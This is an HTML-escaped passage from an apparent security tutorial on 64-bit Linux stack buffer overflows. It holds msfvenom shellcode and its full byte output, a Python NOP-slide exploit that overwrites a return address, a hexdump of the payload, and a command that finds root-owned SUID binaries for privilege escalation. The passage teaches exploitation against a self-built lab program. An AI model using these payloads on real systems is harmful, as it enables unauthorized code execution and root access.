&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;run Burak&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;\x90&quot;x16&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/21.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have succesfully overwrote the return address.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;injecting-a-shell-code&quot;&gt;Injecting a Shell Code&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What is the point of chaning the address of the instruction pointer? To be able to run our own instructions
of course. Shell code is a set of machine code instructions which spawns a shell for us. Let’s create one
with &lt;strong&gt;msfvenom&lt;/strong&gt; framework.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x64/exec &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; linux &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; c &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\x00\x09\x0a\x20&apos;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No &lt;span class=&quot;nb&quot;&gt;arch &lt;/span&gt;selected, selecting &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9, &lt;span class=&quot;nv&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;iteration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
x64/xor chosen with final size 63
Payload size: 63 bytes
Final size of c file: 291 bytes
unsigned char buf[] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;23&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;df&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stands for payload, we want to spawn a /bin/sh shell.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;–platform&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Declaring the platform is linux.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-f&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stands for format. We want our shellcode in the C syntax.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-b&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Declaring the bad characters.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Parameters above are obvious. However, I want you to notice the &lt;strong&gt;-b&lt;/strong&gt; flag. We have excluded some characters 
to be generated in our shellcode.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h2 id=&quot;bad-chars&quot;&gt;Bad chars&lt;br /&gt;&lt;/h2&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bad chars also called invalid characters. When they are received by the program, they 
are being filtered and replaced with other values. Eventually makes our generated 
shell code useless. There is no universal set of bad characters. Depending on the application and the developer logic there 
is a different set of bad characters for every binary that we would encounter.
Therefore, it is a must to find out the bad characters in every executable before generating the shell code.
In our case ‘\x00\x09\x0a\x20’ are the bad chars. You can read how to find bad chars here.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;vulnerable-program&quot;&gt;Vulnerable Program&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now we have every bit of knowledge what is a buffer-overflow vulnerability and how to exploit it. It is time to practice it.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/1.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s compile the code.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/2.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Notice those given parameters to the compiler. Those flags are passed in order to disable some protection 
mechanisms that the compiler applies. Step by step I will disable all those protection mechanisms and teach you 
how to bypass those protections. However, since we are just starting, in order to learn, those mechanisms are better 
shutted off.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-g&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Includes the source code in plain text, easier to debug.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-fno-stack-protector&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Removes the stack Canaries which checks for stack smashing.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-z execstack&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Disables the NX bit and makes the stack executable.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;aslr&quot;&gt;ASLR&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;!-- Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program,  --&gt;
&lt;!-- shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a  --&gt;
&lt;!-- service, as knowledge about where the stack, heap, or libc can&apos;t be re-used between program launches. --&gt;
&lt;!-- This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. --&gt;

&lt;p&gt;Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default.
ASLR stands for Address Space Layout Randomization. It protects the memory by randomizing the 
address space areas for libraries, stack, heap etc. This protection mechanism makes it harder 
for attacker to predict the correct addresses. There are few techniques to bypass this prevention too,
but just like I said before, for now, we will disable it too.
&lt;!----&gt;
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/3.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/9.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our buffer was 256 bytes long. So, passing 500 characters into the buffer ends up with a segmentation fault.
Now we need to find out what is the offset for the saved return address.&lt;/p&gt;

&lt;p&gt;First let’s create a pattern.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/10.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then lets check the RBP to examine the offset.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/11.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Starting from the buffer, if we go 256-bytes, we will hit the first memory address of where the SFP stored.
Therefore, the upcoming eight bytes are dedicated for the SFP. Further six bytes stores the RIP 
(Remember the canonical addresses for X64). Let’s also test this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;r &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot;x256&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;BBBBBBBBZZZZZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ASCII correspondence for &lt;strong&gt;Z&lt;/strong&gt; is &lt;strong&gt;5a&lt;/strong&gt;, and &lt;strong&gt;42&lt;/strong&gt; for &lt;strong&gt;B&lt;/strong&gt;. Therefore, we should expect to see the RIP is restored as full of &lt;strong&gt;5a&lt;/strong&gt;,
and the RBP set to &lt;strong&gt;42&lt;/strong&gt; completely..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/22.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, debugger can not recognize the function and marked it as &lt;strong&gt;??&lt;/strong&gt;, because the return address is not real.
Time to inject our shellcode to the buffer and point the instruction pointer to it.&lt;/p&gt;

&lt;p&gt;There is a special instruction called NOP in assembly. And HEX value of the instruction is \x90. If the 
instruction pointer hits to an \x90, it will increment its value by the length of the instruction, and move on.
By filling the buffer with those instructions we are creating something called &lt;strong&gt;NOP slide&lt;/strong&gt;. As the name 
suggests, the instruction pointer will slide through until it hits to the shell code. By implementing this method, 
we no longer have to be %100 precise about the memory address of the shell code. As long as we point somewhere
in the NOP slide, the shell code will be executed eventually. And also in execution, those addresses may alter 
in each run. We bypass this behaviour.&lt;/p&gt;

&lt;p&gt;This is how the memory should look like as the process proceeds.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/23.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Regardless it is precise or relative, first we have to select an address after we send the payload. In order to select an address in the 
buffer we have to stop the execution before the vulnerable function returns and examine its stack frame. 
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/24.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For this demo, let’s select the address ends with 0x3f0.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xff\xff\x48\xbb\x3f\x5d\x0c\x3b\x1c\x04\x8d\x1e\x48&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x77\xe5\x23&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x59\x75\x6a\xa2\x6d\x57\x5d\x95\x6b\x48\x5b\xdf\x40\x55&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x54\x34\x19\x04\x8d\x1e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf0\xe3\xff\xff\xff\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Modern day CPU’s are little endian. This is why the address we picked is written in the reverse order byte wise in the function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; python stackBased.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; stackBasedPayload.txt
KnuckleSecurity :: -&amp;gt; hexdump stackBasedPayload.txt
0000000 9090 9090 9090 9090 9090 9090 9090 9090
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
00000c0 4890 c931 8148 fde9 ffff 48ff 058d ffef
00000d0 ffff bb48 5d3f 3b0c 041c 1e8d 3148 2758
00000e0 2d48 fff8 ffff f4e2 e577 5923 6a75 6da2
00000f0 5d57 6b95 5b48 40df 6655 3454 0419 1e8d
0000100 9090 9090 9090 9090 e3f0 ffff 7fff
000010e
KnuckleSecurity :: -&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’ supply the debugger with the payload and examine the memory.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/25.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfect. The memory layout is set just as we wished.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Now it is time to run it without the debugger.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/26.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Worked liked charm :)&lt;/p&gt;

&lt;p&gt;You may be wondering what is the point of it? I was using ZSH but now Bash. So what?
And at this point, we need to talk about something called &lt;strong&gt;privilege escalation&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;setuid&quot;&gt;SETUID&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Setuid bit enables user to execute the binary with the privileges of the user who owns the binary. Therefore, 
if a binary is owned by root and has an setuid bit, the binary will be executed as root irrespective of the 
user. The flags setuid and setgid are needed for tasks that require different privileges than what the user 
is normally granted, such as the ability to alter system files or databases to change their login password.
For example, &lt;strong&gt;passwd&lt;/strong&gt; binary is a setuid executable. Sudo, su, chsh, ping, mount are other suid executable 
examples.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/4.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, if a setuid binary is implemented improperly it can cause problems such as granting root 
privileges to a non-root user, also called privilege escalation. 
Let’s create a SUID binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/5.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/6.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see first, root owned the file and then put the setuid bit to the binary.
Even we run it as a non-root user, it executed as root user.&lt;/p&gt;

&lt;p&gt;There is a usefull script you can run in order to find all suid bit binaries owned by root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now combine those two concepts. Imagine there is a SUID binary file with a buffer-overflow vulnerability.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
